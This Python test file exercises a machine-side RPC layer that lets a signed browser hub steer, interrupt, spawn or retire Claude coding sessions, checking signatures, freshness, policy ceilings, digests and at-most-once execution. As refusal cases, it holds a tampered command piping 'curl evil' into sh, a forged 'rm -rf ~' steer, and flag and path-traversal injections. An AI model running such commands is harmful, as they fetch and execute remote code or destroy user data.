#!/usr/bin/env python3
"""The RPCs on the machine side (DC7 M3 of the desk): DX6's RPCs verified,
bound to where they run, checked against the machine's policy, executed at
most once through DC2's bridge (or `sminos` for spawn and retire), and
answered as DX2 `rpc-result`, republished until `rpc-ack`.

Two halves.

- `Checks` drives `sminos_rpc.Rpcs` in this process against DC2's real
  bridge child, with this test as its mod (`Mod`: commands answered as
  bridge.tsx answers them), and a `claude` stand-in for spawn and retire.
  Each refusal of DX6's order is produced on purpose, and the ledger's
  claims are reconciled from their traces.
- `Uplink` runs `sminos daemon uplink` against the hub stand-in
  (hub_standin.py, unchanged: the test sends `rpc` and `rpc-ack` down and
  reads the `rpc-result`s the uplink posted), or against DC3's local hub when
  DESK_HUB names its stand-in for Access (the test is a browser of the
  project, sending DX3 `rpc` and reading `rpc-state`): a cut after
  execution and a restart between execution and report each resolve with
  the RPC executed once, and a spawn retried with its nonce after a cut
  yields one session.

Hermetic: HOME and SMINOS_HOME are temporary (test_session_plane's); nothing
reaches beyond 127.0.0.1 and this directory.
"""

import hashlib
import json
import os
import shutil
import signal
import subprocess
import threading
import time
import unittest
import uuid as uuidlib

import test_session_plane as tsp  # noqa: E402 — first: it makes this run's HOME and SMINOS_HOME
import test_policy_requests as tpr  # noqa: E402

import sminos  # noqa: E402
import sminos_codes as codes  # noqa: E402
import sminos_policy as policy  # noqa: E402
import sminos_requests as requests  # noqa: E402
import sminos_rpc as rpcs  # noqa: E402

T = tsp.T
KEY = tpr.KEY
CLI = tpr.CLI
MEMBER = tpr.MEMBER
GIT = tpr.GIT
wait_for = tpr.wait_for
cli = tpr.cli

FAKE_CLAUDE = r'''#!/usr/bin/env python3
"""A stand-in for `claude` (tests only): `agents`, `stop <short>`, and a
`--bg` launch, each call logged, every launch a row of `agents`."""
import glob, json, os, sys, time, uuid
state = os.environ["FAKE_CLAUDE_STATE"]
os.makedirs(os.path.join(state, "agents"), exist_ok=True)
args = sys.argv[1:]
with open(os.path.join(state, "calls.log"), "a") as f:
    f.write(json.dumps(args) + "\n")
if args[:1] == ["agents"]:
    print(json.dumps([json.load(open(p)) for p in sorted(glob.glob(os.path.join(state, "agents", "*.json")))]))
    sys.exit(0)
if args[:1] == ["stop"]:
    p = os.path.join(state, "agents", args[1] + ".json")
    if os.path.exists(p):
        row = json.load(open(p))
        row["state"] = "stopped"
        json.dump(row, open(p, "w"))
    print("stopped " + args[1])
    sys.exit(0)
if "--bg" in args:
    try:
        time.sleep(float(open(os.path.join(state, "bg-sleep")).read()))
    except (OSError, ValueError):
        pass
    short = os.urandom(4).hex()
    name = args[args.index("-n") + 1]
    row = {"id": short, "sessionId": str(uuid.uuid4()), "kind": "background", "name": name,
           "state": "working", "cwd": os.getcwd()}
    json.dump(row, open(os.path.join(state, "agents", short + ".json"), "w"))
    print("backgrounded · %s · %s" % (short, name))
    sys.exit(0)
sys.exit(0)
'''


def install_claude(name):
    """The `claude` stand-in first on PATH; its state directory."""
    bindir = os.path.join(T, "bin-" + name)
    state = os.path.join(T, "claude-" + name)
    os.makedirs(bindir, exist_ok=True)
    os.makedirs(state, exist_ok=True)
    path = os.path.join(bindir, "claude")
    with open(path, "w") as f:
        f.write(FAKE_CLAUDE)
    os.chmod(path, 0o755)
    os.environ["PATH"] = bindir + os.pathsep + os.environ["PATH"]
    os.environ["FAKE_CLAUDE_STATE"] = state
    return state


def launches(state):
    """The `--bg` launches the stand-in saw, each its argv."""
    try:
        with open(os.path.join(state, "calls.log")) as f:
            calls = [json.loads(line) for line in f if line.strip()]
    except OSError:
        return []
    return [c for c in calls if "--bg" in c]


def iso(epoch):
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(epoch)) + ".%03dZ" % int((epoch % 1) * 1000)


def sign(key, name, project, args, machine="testhost", created=None, nonce=None, member=MEMBER):
    """An RPC as the browser seals it (DX6, DX1)."""
    draft = {"rpc": name, "project": project, "machine": machine, "member": member,
             "created": created or iso(time.time()), "nonce": nonce or codes.b64url(os.urandom(16)), "args": args}
    return codes.seal(key, "rpc", project, draft, None)


def digest_of(sid, rid, tool, tool_input):
    return {"session": sid, "request": rid, "tool": tool, "input_sha256": codes.input_sha256(tool_input)}


def transcript(sid):
    d = os.path.join(os.environ["HOME"], ".claude", "projects", "-rpc-test")
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, sid + ".jsonl")


def append_row(sid, row):
    with open(transcript(sid), "a") as f:
        f.write(json.dumps(row) + "\n")


class Mod(tpr.Bridge):
    """DC2's bridge child with this test as its mod: each command answered
    as bridge.tsx answers it. `turn` is the main turn running (None: idle);
    `hold` delays each answer; a steer's row is written to the transcript
    before its answer, as the engine writes an appended row."""

    def __init__(self, sid):
        self.commands = []
        self.turn = None
        self.hold = 0.0
        self.answer_steer = True  # False: the row is written, the answer never comes
        self.rows = []
        super().__init__(sid)

    def drain(self):
        with self.proc.stdout:
            for line in self.proc.stdout:
                cmd = json.loads(line)
                self.commands.append(cmd)
                threading.Thread(target=self.answer, args=(cmd,), daemon=True).start()

    def ops(self, op):
        return [c for c in self.commands if c.get("op") == op]

    def answer(self, cmd):
        time.sleep(self.hold)
        op = cmd["op"]
        after = []
        if op == "steer":
            if self.turn is None:
                res = {"ok": False, "error": "no turn is running to steer: send it instead"}
            else:
                row = str(uuidlib.uuid4())
                self.rows.append(row)
                append_row(self.sid, {"type": "user", "uuid": row, "timestamp": iso(time.time()),
                                      "message": {"role": "user", "content": [{"type": "text", "text": cmd["text"]}]}})
                if not self.answer_steer:
                    return
                res = {"ok": True, "result": {"row": row}}
        elif op == "interrupt":
            res = {"ok": True, "result": {"turnId": self.turn, "stopped": ["b1x2y3z4"] if self.turn else [],
                                          "running": []}}
        elif op == "model":
            model = None if cmd.get("model") in (None, "default") else cmd["model"]
            res = {"ok": True, "result": {"model": model, "effort": cmd.get("effort")}}
        elif op == "compact":
            if self.turn is not None:
                res = {"ok": True, "result": {"queued": True, "turnId": self.turn}}
            else:
                res = {"ok": True, "result": {"started": True}}
                after = [{"type": "compact", "phase": "start", "id": cmd["id"]},
                         {"type": "compact", "phase": "end", "id": cmd["id"], "tokensBefore": 9000,
                          "tokensAfter": 1200}]
        elif op == "deliver":
            self.delivered.append(cmd["text"])
            self.post({"type": "delivered", "key": cmd["key"], "outcome": "submitted"})
            res = {"ok": True, "result": {"submitted": True}}
        else:
            res = {"ok": False, "error": "unknown op: %s" % op}
        if op == "compact" and after:
            self.post(after[0])
        self.post({"type": "result", "id": cmd["id"], "op": op, **res})
        for e in after[1:]:
            self.post(e)


class Here:
    """What the uplink knows of this machine, as sminos_rpc asks it."""

    def __init__(self, project, sessions, live):
        self.p = project
        self.sessions = sessions
        self.live = live

    def project(self, pid):
        return self.p if pid == self.p.id else None

    def has_session(self, _project, sid):
        return sid in self.sessions

    def record(self, sid):
        return self.live.get(sid)

    def checkouts(self, project):
        return policy.known_checkouts(project)


def results(frames, nonce):
    return [f["outcome"] for f in frames if f.get("t") == "rpc-result" and f.get("nonce") == nonce]


class Checks(unittest.TestCase):
    """DX6's checks in order, and execution through the real bridge child."""

    @classmethod
    def setUpClass(cls):
        cls.claude = install_claude("checks")
        cls.root, cls.pid = tpr.make_project("rpcproj")
        subprocess.run(GIT + ["-C", cls.root, "commit", "-q", "--allow-empty", "-m", "base"], check=True)
        cls.other_root, cls.other_pid = tpr.make_project("rpcother")
        cls.bridged = tpr.Session(cls.root)
        cls.plain = tpr.Session(cls.root)
        cls.mod = Mod(cls.bridged.sid)
        r = cli("daemon", "tick")
        assert r.returncode == 0, r.stderr
        cls.project = tpr.project_of(cls.root)
        cls.ended = str(uuidlib.uuid4())

    @classmethod
    def tearDownClass(cls):
        cls.mod.stop()
        cls.bridged.end()
        cls.plain.end()

    def setUp(self):
        tpr.clear_policy()
        try:
            os.unlink(os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE))
        except OSError:
            pass
        self.mod.turn = None
        self.mod.hold = 0.0
        self.mod.answer_steer = True
        self.mod.commands.clear()
        self.clock = [time.time()]
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        live = {self.bridged.sid: {"pid": self.bridged.holder.pid, "kind": "interactive"},
                self.plain.sid: {"pid": self.plain.holder.pid, "kind": "interactive"}}
        self.here = Here(self.project, {self.bridged.sid, self.plain.sid, self.ended}, live)
        self.frames = []

    def tearDown(self):
        tpr.clear_policy()

    def send(self, name, args, **kw):
        rpc = sign(KEY, name, kw.pop("project", self.pid), args, **kw)
        self.r.receive(rpc, self.here)
        return rpc

    def collect(self):
        frames = self.r.due({self.pid, self.other_pid})
        self.r.sent(frames)
        self.frames += frames
        return self.frames

    def outcome(self, rpc, timeout=15.0):
        got = wait_for(lambda: results(self.collect(), rpc["nonce"]), timeout)
        self.assertTrue(got, "a result for %s" % rpc["rpc"])
        return got[-1]

    def refused(self, rpc, code):
        o = self.outcome(rpc)
        self.assertEqual(o["state"], "failed", o)
        self.assertEqual(o["error"]["code"], code, o)
        self.assertTrue(o["error"]["message"])
        return o

    def ledger(self):
        try:
            with open(os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)) as f:
                return json.load(f)
        except OSError:
            return {}

    # ------------------------------------------------ before the ledger

    def test_a_bad_code_is_refused_and_kept_out_of_the_ledger(self):
        rpc = sign(KEY, "steer", self.pid, {"session": self.bridged.sid, "text": "go"})
        rpc["args"]["text"] = "something else"
        self.mod.turn = "t1"
        self.r.receive(rpc, self.here)
        self.refused(rpc, "bad-code")
        self.assertNotIn(rpc["nonce"], self.ledger())
        self.assertEqual(self.mod.ops("steer"), [], "nothing ran")
        other = sign(b"\x01" * 32, "steer", self.pid, {"session": self.bridged.sid, "text": "go"})
        self.r.receive(other, self.here)
        self.refused(other, "bad-code")

    def test_b_where_it_runs_is_checked_before_the_ledger_and_freshness(self):
        stale = iso(time.time() - 600)
        wrong = self.send("steer", {"session": self.bridged.sid, "text": "go"}, machine="mini", created=stale)
        self.refused(wrong, "wrong-machine")
        # Signed for the other project (a hub project of this org, but not
        # where the session is): the session is not that project's.
        outside = self.send("interrupt", {"session": self.bridged.sid}, project=self.other_pid, created=stale)
        self.refused(outside, "unknown-project")
        nobody = self.send("interrupt", {"session": str(uuidlib.uuid4())}, created=stale)
        self.refused(nobody, "no-session")
        for rpc in (wrong, outside, nobody):
            self.assertNotIn(rpc["nonce"], self.ledger(), "refused before the ledger")
        self.assertEqual(self.mod.ops("interrupt"), [])

    def test_b_a_session_outside_its_signed_project_is_refused(self):
        here = Here(self.project, set(), {})
        here.project = lambda pid: {self.pid: self.project, self.other_pid: tpr.project_of(self.other_root)}.get(pid)
        here.has_session = lambda project, sid: project.id == self.pid and sid == self.bridged.sid
        rpc = sign(KEY, "interrupt", self.other_pid, {"session": self.bridged.sid})
        self.r.receive(rpc, here)
        self.refused(rpc, "no-session")
        self.assertEqual(self.mod.ops("interrupt"), [])

    # ------------------------------------------------ the ledger, then freshness

    def test_c_a_known_nonce_is_answered_from_the_ledger_before_freshness(self):
        self.mod.turn = "t1"
        rpc = self.send("steer", {"session": self.bridged.sid, "text": "once"})
        first = self.outcome(rpc)
        self.assertEqual(first["state"], "done", first)
        self.clock[0] += 120  # long past its freshness: the ledger still answers it
        self.r.receive(rpc, self.here)
        again = wait_for(lambda: len(results(self.collect(), rpc["nonce"])) >= 2 and results(self.frames, rpc["nonce"]))
        self.assertTrue(again, "answered again")
        self.assertEqual(again[-1], first, "from the ledger")
        self.assertEqual(len(self.mod.ops("steer")), 1, "executed once")

    def test_c_stale_either_way(self):
        old = self.send("interrupt", {"session": self.bridged.sid}, created=iso(time.time() - 61))
        self.refused(old, "stale")
        ahead = self.send("interrupt", {"session": self.bridged.sid}, created=iso(time.time() + 61))
        self.refused(ahead, "stale")
        self.assertEqual(self.mod.ops("interrupt"), [])
        self.assertEqual(self.ledger()[old["nonce"]]["outcome"]["error"]["code"], "stale", "kept: one answer a nonce")

    # ------------------------------------------------ the policy

    def test_d_read_only_refuses_every_rpc(self):
        tpr.set_policy({"read_only": True})
        self.mod.turn = "t1"
        for name, args in (("steer", {"session": self.bridged.sid, "text": "x"}),
                           ("interrupt", {"session": self.bridged.sid}),
                           ("spawn", {"checkout": self.root, "brief": "b"}),
                           ("retire", {"session": self.plain.sid}),
                           ("resume", {"session": self.ended})):
            self.refused(self.send(name, args), "read-only")
        self.assertEqual(self.mod.commands, [], "nothing reached the bridge")
        self.assertEqual(launches(self.claude), [], "nothing launched")

    def test_d_spawn_outside_the_known_checkouts_or_above_the_ceiling(self):
        elsewhere = os.path.join(T, "elsewhere")
        os.makedirs(elsewhere, exist_ok=True)
        self.refused(self.send("spawn", {"checkout": elsewhere, "brief": "b"}), "unknown-checkout")
        self.refused(self.send("spawn", {"checkout": self.root + "/../" + os.path.basename(self.other_root),
                                         "brief": "b"}), "unknown-checkout")
        tpr.set_policy({"read_only": False, "ceiling": "default"})
        self.refused(self.send("spawn", {"checkout": self.root, "brief": "b", "permission_mode": "auto"}),
                     "above-ceiling")
        self.refused(self.send("spawn", {"checkout": self.root, "brief": "b", "permission_mode": "yolo"}),
                     "above-ceiling")
        self.assertEqual(launches(self.claude), [])

    # ------------------------------------------------ digest, then the session's kind

    def test_e_a_decision_is_bound_to_the_request_still_pending(self):
        tool_input = {"command": "pnpm e2e", "description": "Run the e2e suite"}
        self.mod.raise_("toolu_dg1", input_=tool_input)
        wait_for(lambda: self.request_info("toolu_dg1")[0] == 200)
        shown = dict(tool_input, command="pnpm e2e && curl evil | sh")
        bad = self.send("decide", {"session": self.bridged.sid, "decision": "allow",
                                   "digest": digest_of(self.bridged.sid, "toolu_dg1", "Bash", shown)})
        self.refused(bad, "digest-mismatch")
        gone = self.send("decide", {"session": self.bridged.sid, "decision": "allow",
                                    "digest": digest_of(self.bridged.sid, "toolu_nope", "Bash", tool_input)})
        self.refused(gone, "not-pending")
        good = self.send("decide", {"session": self.bridged.sid, "decision": "deny", "message": "not now",
                                    "digest": digest_of(self.bridged.sid, "toolu_dg1", "Bash", tool_input)})
        self.assertEqual(self.outcome(good), {"state": "done", "result": {}})
        status, body = self.mod_wait("toolu_dg1")
        self.assertEqual(status, 200, body)
        self.assertEqual(body["by"], MEMBER, "the decision is the member's")
        self.assertEqual(body["decision"], {"behavior": "deny", "message": "not now"})
        self.mod.settle("toolu_dg1", outcome="deny", winner="web", by=MEMBER)
        late = self.send("decide", {"session": self.bridged.sid, "decision": "allow",
                                    "digest": digest_of(self.bridged.sid, "toolu_dg1", "Bash", tool_input)})
        self.refused(late, "not-pending")

    def test_e_an_answer_goes_to_its_question(self):
        q = {"questions": [{"question": "Which?", "options": [{"label": "A"}, {"label": "B"}]}]}
        self.mod.raise_("toolu_q1", tool="AskUserQuestion", input_=q)
        wait_for(lambda: self.request_info("toolu_q1")[0] == 200)
        rpc = self.send("answer", {"session": self.bridged.sid, "answers": {"Which?": "B"},
                                   "digest": digest_of(self.bridged.sid, "toolu_q1", "AskUserQuestion", q)})
        self.assertEqual(self.outcome(rpc), {"state": "done", "result": {}})
        status, body = self.mod_wait("toolu_q1")
        self.assertEqual(body["decision"], {"behavior": "allow", "updatedInput": {"answers": {"Which?": "B"}}})
        self.mod.settle("toolu_q1", outcome="answered", winner="web", by=MEMBER)

    def request_info(self, rid):
        import sminos_bridge as bridge
        return bridge.request(bridge.endpoint(self.bridged.sid), "GET", "/requests/" + rid)

    def mod_wait(self, rid):
        import sminos_bridge as bridge
        return bridge.request(bridge.endpoint(self.bridged.sid), "GET", "/requests/%s/wait?ms=5000" % rid)

    def test_e_what_a_session_without_a_bridge_cannot_do_is_unsupported(self):
        for name, args in (("interrupt", {"session": self.plain.sid}),
                           ("model", {"session": self.plain.sid, "effort": "high"}),
                           ("compact", {"session": self.plain.sid}),
                           ("decide", {"session": self.plain.sid, "decision": "allow",
                                       "digest": digest_of(self.plain.sid, "toolu_x", "Bash", {})}),
                           ("steer", {"session": self.ended, "text": "x"}),
                           ("interrupt", {"session": self.ended}),
                           ("resume", {"session": self.ended})):
            self.refused(self.send(name, args), "unsupported")

    # ------------------------------------------------ execution, through DC2's protocol

    def test_f_steer_interrupt_model(self):
        idle = self.send("steer", {"session": self.bridged.sid, "text": "too late"})
        self.refused(idle, "idle")
        self.mod.turn = "turn-1"
        steer = self.send("steer", {"session": self.bridged.sid, "text": "also check the docs"})
        o = self.outcome(steer)
        self.assertEqual(o["state"], "done", o)
        self.assertEqual(o["result"], {"row": self.mod.rows[-1]}, "the appended row's uuid")
        self.assertEqual([c["text"] for c in self.mod.ops("steer")], ["too late", "also check the docs"])
        intr = self.send("interrupt", {"session": self.bridged.sid})
        self.assertEqual(self.outcome(intr), {"state": "done", "result": {"turnId": "turn-1", "stopped": ["b1x2y3z4"],
                                                                         "running": []}})
        model = self.send("model", {"session": self.bridged.sid, "model": "claude-opus-4-1"})
        self.assertEqual(self.outcome(model), {"state": "done", "result": {"model": "claude-opus-4-1",
                                                                           "effort": None}})
        # The kept choice: an effort alone keeps the model chosen before.
        import sminos_bridge as bridge
        self.mod.post({"type": "model", "model": "claude-opus-4-1", "effort": None})
        wait_for(lambda: (bridge.load_kept(self.bridged.sid)["override"] or {}).get("model"))
        effort = self.send("model", {"session": self.bridged.sid, "effort": "high"})
        self.assertEqual(self.outcome(effort), {"state": "done", "result": {"model": "claude-opus-4-1",
                                                                            "effort": "high"}})
        self.assertEqual(self.mod.ops("model")[-1]["model"], "claude-opus-4-1")
        back = self.send("model", {"session": self.bridged.sid, "model": "default"})
        self.assertEqual(self.outcome(back)["state"], "done")
        self.assertEqual(self.mod.ops("model")[-1]["model"], "default")

    def test_f_a_steer_to_a_session_without_a_bridge_takes_sminos_steer(self):
        rpc = self.send("steer", {"session": self.plain.sid, "text": "-n also the changelog"})
        self.assertEqual(self.outcome(rpc, timeout=30), {"state": "done", "result": {"row": None}},
                         "delivered; no row is named without a bridge")
        self.assertTrue(wait_for(lambda: "-n also the changelog" in self.plain.inbox.texts()),
                        "as a cross-session frame on its inbox (§5): %r" % self.plain.inbox.texts())

    def test_f_compact_answers_at_once_and_its_outcome_follows_carrying_the_nonce(self):
        reqs = requests.Requests(KEY, "testhost")
        reqs.follow({self.bridged.sid: self.pid})
        try:
            self.mod.turn = "turn-2"
            held = self.send("compact", {"session": self.bridged.sid})
            self.assertEqual(self.outcome(held), {"state": "done", "result": {"at": "turn-end"}})
            self.mod.turn = None
            now = self.send("compact", {"session": self.bridged.sid})

            def compacts():
                reqs.take()
                self.r.compacted(reqs.take_compacts())
                return [f["message"] for f in self.collect() if f.get("t") == "session"
                        and f["message"]["kind"] == "compact" and f["message"]["body"]["rpc"] == now["nonce"]]
            got = wait_for(lambda: len(compacts()) >= 2 and compacts())
            self.assertTrue(got, "the compaction's start and end, as DX4 compact")
            self.assertEqual(results(self.frames, now["nonce"]), [{"state": "done", "result": {"at": "now"}}])
            self.assertEqual([m["body"] for m in got],
                             [{"rpc": now["nonce"], "phase": "start"},
                              {"rpc": now["nonce"], "phase": "end", "tokensBefore": 9000, "tokensAfter": 1200}])
            m = got[0]
            self.assertEqual((m["project"], m["machine"], m["session"], m["sub"], m["n"]),
                             (self.pid, "testhost", self.bridged.sid, None, None))
        finally:
            reqs.close()

    def test_g_spawn_and_retire_through_sminos(self):
        tpr.set_policy({"read_only": False, "ceiling": "acceptEdits"})
        before = len(launches(self.claude))
        rpc = self.send("spawn", {"checkout": self.root, "brief": "tidy the docs", "model": "claude-sonnet-4-5",
                                  "effort": "low"})
        o = self.outcome(rpc, timeout=60)
        self.assertEqual(o["state"], "done", o)
        sid, alias = o["result"]["session"], o["result"]["alias"]
        self.assertTrue(sminos.UUID_RE.match(sid), o)
        bg = launches(self.claude)[before:]
        self.assertEqual(len(bg), 1)
        argv = bg[0]
        self.assertEqual(argv[argv.index("--permission-mode") + 1], "acceptEdits",
                         "no mode asked: the ceiling, passed explicitly")
        self.assertEqual(argv[argv.index("--model") + 1], "claude-sonnet-4-5")
        self.assertEqual(argv[argv.index("--effort") + 1], "low")
        self.assertEqual(argv[argv.index("-n") + 1], alias)
        seat = [s for s in sminos.seats() if s.get("rpc_nonce") == rpc["nonce"]]
        self.assertEqual([(s["current"], s["alias"], s["brief"]) for s in seat], [(sid, alias, "tidy the docs")],
                         "the seat carries its nonce, and the brief as its in-charge line")
        again = self.send("spawn", {"checkout": self.root, "brief": "tidy the docs", "model": "claude-sonnet-4-5",
                                    "effort": "low"}, nonce=rpc["nonce"], created=rpc["created"])
        self.assertTrue(wait_for(lambda: len(results(self.collect(), rpc["nonce"])) >= 2))
        self.r.receive(rpc, self.here)
        got = wait_for(lambda: len(results(self.collect(), rpc["nonce"])) >= 3 and results(self.frames, rpc["nonce"]))
        self.assertEqual(got, [o, o, o], "a retry, and the same RPC again: each answered from the ledger")
        self.assertEqual(again["nonce"], rpc["nonce"])
        self.assertEqual(len(launches(self.claude)) - before, 1, "one session")

        self.here.sessions.add(sid)
        retire = self.send("retire", {"session": sid})
        self.assertEqual(self.outcome(retire, timeout=60), {"state": "done", "result": {}})
        sminos.forget_caches()
        latest = sminos.view_of(self.project, titles=False).info[sid]["latest"]
        self.assertEqual(latest["kind"], "retired", "recorded as sminos retire records it")

    def test_g_a_permission_mode_at_or_below_the_ceiling_is_passed(self):
        tpr.set_policy({"read_only": False, "ceiling": "auto"})
        before = len(launches(self.claude))
        rpc = self.send("spawn", {"checkout": self.root, "brief": "plan it", "permission_mode": "plan",
                                  "worktree": "web-plan"})
        self.assertEqual(self.outcome(rpc, timeout=60)["state"], "done")
        argv = launches(self.claude)[before]
        self.assertEqual(argv[argv.index("--permission-mode") + 1], "plan")
        self.assertEqual(argv[argv.index("--worktree") + 1], "web-plan")
        bad = self.send("spawn", {"checkout": self.root, "brief": "b", "worktree": "../escape"})
        self.refused(bad, "bad-shape")
        flag = self.send("spawn", {"checkout": self.root, "brief": "b", "model": "--dangerously-skip-permissions"})
        self.refused(flag, "bad-shape")

    # ------------------------------------------------ at most once, across a stop

    def claim(self, nonce, name, session, at, **extra):
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        d = self.ledger()
        d[nonce] = {"project": self.pid, "rpc": name, "session": session, "at": at, **extra}
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            json.dump(d, f)

    def test_h_a_claim_left_without_an_outcome_is_reconciled_from_its_trace(self):
        now = time.time()
        text = "the steer that landed"
        row = str(uuidlib.uuid4())
        append_row(self.bridged.sid, {"type": "user", "uuid": row, "timestamp": iso(now + 0.5),
                                      "message": {"role": "user", "content": [{"type": "text", "text": text}]}})
        self.claim("AAAAAAAAAAAAAAAAAAAAAA", "steer", self.bridged.sid, now,
                   text_sha256=hashlib.sha256(text.encode()).hexdigest())
        self.claim("BBBBBBBBBBBBBBBBBBBBBA", "steer", self.bridged.sid, now - 3600,
                   text_sha256=hashlib.sha256(b"never written").hexdigest())
        self.claim("CCCCCCCCCCCCCCCCCCCCCA", "interrupt", self.bridged.sid, now)
        self.claim("DDDDDDDDDDDDDDDDDDDDDA", "steer", self.bridged.sid, now,
                   text_sha256=hashlib.sha256(b"not yet").hexdigest())
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        frames = r.due({self.pid})
        self.assertEqual(results(frames, "AAAAAAAAAAAAAAAAAAAAAA"), [{"state": "done", "result": {"row": row}}],
                         "a steer's row is in the transcript")
        for nonce in ("BBBBBBBBBBBBBBBBBBBBBA", "CCCCCCCCCCCCCCCCCCCCCA"):
            o = results(frames, nonce)
            self.assertEqual([x["error"]["code"] for x in o], ["interrupted"], nonce)
        self.assertEqual(results(frames, "DDDDDDDDDDDDDDDDDDDDDA"), [], "its row may still come: not answered yet")
        self.assertEqual(self.ledger()["DDDDDDDDDDDDDDDDDDDDDA"].get("outcome"), None)
        self.clock[0] = now + rpcs.STEER_TRACE_S + 1
        o = results(r.due({self.pid}), "DDDDDDDDDDDDDDDDDDDDDA")
        self.assertEqual([x["error"]["code"] for x in o], ["interrupted"])

    def test_h_a_claimed_spawn_is_found_by_its_nonce(self):
        nonce = "EEEEEEEEEEEEEEEEEEEEEA"
        sid = str(uuidlib.uuid4())
        sminos.meta_set(sid, {"uuid": sid, "current": sid, "alias": "web-found", "group": "rpcproj", "cwd": self.root,
                              "status": "working", "rpc_nonce": nonce})
        self.claim(nonce, "spawn", None, time.time())
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual(results(r.due({self.pid}), nonce),
                         [{"state": "done", "result": {"session": sid, "alias": "web-found"}}])

    def test_i_results_are_republished_until_acknowledged(self):
        self.mod.turn = "t9"
        rpc = self.send("interrupt", {"session": self.bridged.sid})
        self.outcome(rpc)
        self.assertEqual(results(self.r.due({self.pid}), rpc["nonce"]), [], "not twice on one stream")
        self.r.reset()  # a new stream
        self.assertEqual(len(results(self.r.opening(self.pid), rpc["nonce"])), 1, "after hello on the next")
        self.r.ack({"t": "rpc-ack", "project": self.pid, "nonce": rpc["nonce"]})
        self.r.reset()
        self.assertEqual(results(self.r.opening(self.pid), rpc["nonce"]), [], "acknowledged: kept, not sent")
        self.assertTrue(self.ledger()[rpc["nonce"]]["acked"])


# ---------------------------------------------------------------- the uplink


class Uplink(unittest.TestCase):
    """RPCs through the uplink's stream: against the hub stand-in, or DC3's
    local hub when DESK_HUB names its stand-in for Access."""

    @classmethod
    def setUpClass(cls):
        cls.procs = []
        cls.claude = install_claude("uplink")
        os.environ["SMINOS_DERIVE_EVERY"] = "0"
        cls.hub = tsp.make_hub(cls.spawn)
        cls.hub.enroll(CLI)
        with open(os.path.join(os.environ["SMINOS_HOME"], "daemon", "hub.json")) as f:
            cls.key = codes.b64url_bytes(json.load(f)["key"], 32)
        cls.root, cls.pid = tpr.make_project("rpcup", cls.hub.url, cls.hub.org)
        subprocess.run(GIT + ["-C", cls.root, "commit", "-q", "--allow-empty", "-m", "base"], check=True)
        cls.session = tpr.Session(cls.root)
        cls.sid = cls.session.sid
        cls.mod = Mod(cls.sid)
        r = cli("daemon", "tick")
        assert r.returncode == 0, r.stderr
        cls.uplink = cls.spawn([CLI, "daemon", "uplink"])
        cls.hub.follow(cls.pid)
        ok = cls.hub.wait(lambda ms: any(m["kind"] == "presence" and m["session"] == cls.sid
                                         and m["body"]["bridge"] for m in ms), timeout=30)
        assert ok is not None, "the uplink connected and said the session's bridge"
        cls.member = MEMBER
        if cls.local():
            cls.member = next(f["member"] for f in cls.hub.socket.received() if f.get("t") == "welcome")

    @classmethod
    def spawn(cls, argv):
        p = subprocess.Popen(argv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cls.procs.append(p)
        return p

    @classmethod
    def tearDownClass(cls):
        tpr.clear_policy()
        cls.mod.stop()
        if cls.local():
            cls.hub.close()
        for p in reversed(cls.procs):
            if p.poll() is None:
                p.terminate()
        for p in cls.procs:
            p.wait(10)
        cls.session.end()

    def setUp(self):
        tpr.clear_policy()
        self.mod.turn = None
        self.mod.hold = 0.0

    @classmethod
    def local(cls):
        return isinstance(cls.hub, tsp.LocalHub)

    def rpc(self, name, args, **kw):
        return sign(self.key, name, self.pid, args, machine=kw.pop("machine", self.hub.machine),
                    member=self.member, **kw)

    def send(self, rpc):
        if self.local():
            self.hub.socket.send({"t": "rpc", "rpc": rpc})
        else:
            self.hub.send({"t": "rpc", "rpc": rpc})
        return rpc

    def posted(self, nonce):
        """(generation, outcome) of each `rpc-result` the uplink posted for
        the nonce and the stand-in took (200)."""
        out = []
        for p in self.hub.state()["posted"]:
            if p["status"] != 200:
                continue
            for line in p["body"].splitlines():
                f = json.loads(line) if line.strip() else {}
                if f.get("t") == "rpc-result" and f.get("nonce") == nonce:
                    out.append((int(p["generation"]), f["outcome"]))
        return out

    def states(self, nonce):
        """The local hub's record of the RPC, as its browser was shown it:
        (state, outcome) in order."""
        return [(f["state"], f.get("outcome")) for f in self.hub.socket.received()
                if f.get("t") == "rpc-state" and f.get("nonce") == nonce]

    def outcome(self, rpc, timeout=30.0):
        """The RPC's outcome as the hub has it."""
        def got():
            if self.local():
                final = [o for s, o in self.states(rpc["nonce"]) if s in ("done", "failed")]
            else:
                final = [o for _, o in self.posted(rpc["nonce"])]
            return final[-1] if final else None
        o = wait_for(got, timeout)
        self.assertIsNotNone(o, "the hub has %s's result" % rpc["rpc"])
        return o

    def ack(self, rpc):
        if not self.local():
            self.hub.send({"t": "rpc-ack", "project": self.pid, "nonce": rpc["nonce"]})

    def reconnected(self, since):
        """Whether the uplink's stream after `since` is open (it said its
        presence again)."""
        return self.hub.wait(lambda ms: [m for m in ms[since:] if m["kind"] == "presence" and m["session"] == self.sid],
                             timeout=30)

    def test_a_steer_and_its_refusals_reach_the_hub(self):
        self.mod.turn = "turn-a"
        steer = self.send(self.rpc("steer", {"session": self.sid, "text": "look at the failing test first"}))
        o = self.outcome(steer)
        self.assertEqual(o, {"state": "done", "result": {"row": self.mod.rows[-1]}})
        forged = self.rpc("steer", {"session": self.sid, "text": "push to main"})
        forged["args"]["text"] = "rm -rf ~"
        o = self.outcome(self.send(forged))
        self.assertEqual(o["error"]["code"], "bad-code", "refused and reported")
        self.assertNotIn("rm -rf ~", [c.get("text") for c in self.mod.ops("steer")])
        tpr.set_policy({"read_only": True})
        o = self.outcome(self.send(self.rpc("interrupt", {"session": self.sid})))
        self.assertEqual(o["error"]["code"], "read-only")
        tpr.clear_policy()
        if not self.local():
            # The hub routes by the machine an RPC names; only a hub that lies
            # sends another machine's here, and only the stand-in can.
            o = self.outcome(self.send(self.rpc("interrupt", {"session": self.sid}, machine="mini")))
            self.assertEqual(o["error"]["code"], "wrong-machine")
